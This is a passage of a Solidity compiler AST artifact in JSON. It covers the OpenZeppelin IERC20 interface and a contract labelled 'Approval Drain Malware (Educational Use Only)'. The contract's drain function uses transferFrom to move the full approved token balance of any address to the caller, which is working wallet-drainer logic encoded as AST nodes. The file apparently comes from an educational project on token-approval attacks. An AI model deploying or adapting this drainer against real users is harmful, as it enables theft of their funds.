										"text": " @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."
									},
									"functionSelector": "dd62ed3e",
									"id": 54,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nameLocation": "1557:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 47,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1575:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1567:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 46,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1567:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 49,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "1590:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1582:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 48,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1582:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1566:32:0"
									},
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1622:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1622:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1621:9:0"
									},
									"scope": 77,
									"src": "1548:83:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 55,
										"nodeType": "StructuredDocumentation",
										"src": "1637:667:0",
										"text": " @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."
									},
									"functionSelector": "095ea7b3",
									"id": 64,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nameLocation": "2318:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 57,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "2334:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2326:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 56,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2326:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "2351:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2343:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2343:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2325:32:0"
									},
									"returnParameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 62,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2376:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 61,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2376:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2375:6:0"
									},
									"scope": 77,
									"src": "2309:73:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 65,
										"nodeType": "StructuredDocumentation",
										"src": "2388:297:0",
										"text": " @dev Moves a `value` amount of tokens from `from` to `to` using the\n allowance mechanism. `value` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "23b872dd",
									"id": 76,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nameLocation": "2699:12:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 67,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "2720:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2712:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 66,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2712:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 69,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "2734:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2726:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 68,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2726:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 71,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "2746:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2738:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 70,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2738:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2711:41:0"
									},
									"returnParameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 74,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2771:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 73,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2771:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2770:6:0"
									},
									"scope": 77,
									"src": "2690:87:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 78,
							"src": "204:2575:0",
							"usedErrors": [],
							"usedEvents": [
								11,
								20
							]
						}
					],
					"src": "106:2674:0"
				},
				"id": 0
			},
			"M/Approval Drain Malware.sol": {
				"ast": {
					"absolutePath": "M/Approval Drain Malware.sol",
					"exportedSymbols": {
						"ApprovalDrain": [
							105
						],
						"IERC20": [
							77
						]
					},
					"id": 106,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 79,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".20"
							],
							"nodeType": "PragmaDirective",
							"src": "32:24:1"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"id": 80,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 106,
							"sourceUnit": 78,
							"src": "58:56:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "ApprovalDrain",
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 81,
								"nodeType": "StructuredDocumentation",
								"src": "116:134:1",
								"text": "@title Approval Drain Malware (Educational Use Only)\n @notice Simulates a malicious contract that drains approved ERC20 tokens"
							},
							"fullyImplemented": true,
							"id": 105,
							"linearizedBaseContracts": [
								105
							],
							"name": "ApprovalDrain",
							"nameLocation": "259:13:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 103,
										"nodeType": "Block",
										"src": "332:138:1",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"id": 92,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 85,
															"src": "382:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"expression": {
																"id": 93,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "400:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 94,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "404:6:1",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "400:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 99,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 85,
																	"src": "448:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 96,
																			"name": "token",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 83,
																			"src": "431:5:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 95,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 77,
																		"src": "424:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$77_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 97,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "424:13:1",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$77",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 98,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "438:9:1",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 34,
																"src": "424:23:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 100,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "424:29:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 89,
																	"name": "token",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 83,
																	"src": "349:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 88,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 77,
																"src": "342:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$77_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 90,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "342:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$77",
																"typeString": "contract IERC20"
															}
														},
														"id": 91,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "356:12:1",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 76,
														"src": "342:26:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 101,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "342:121:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 102,
												"nodeType": "ExpressionStatement",
												"src": "342:121:1"
											}
										]
									},
									"functionSelector": "837971e4",
									"id": 104,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "drain",
									"nameLocation": "288:5:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 86,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 83,
												"mutability": "mutable",
												"name": "token",
												"nameLocation": "302:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 104,
												"src": "294:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 82,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "294:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 85,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "317:4:1",
												"nodeType": "VariableDeclaration",
												"scope": 104,
												"src": "309:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 84,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "309:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "293:29:1"
									},
									"returnParameters": {
										"id": 87,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "332:0:1"
									},
									"scope": 105,
									"src": "279:191:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 106,
							"src": "250:222:1",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:441:1"
				},
				"id": 1
			}
		}
	}
}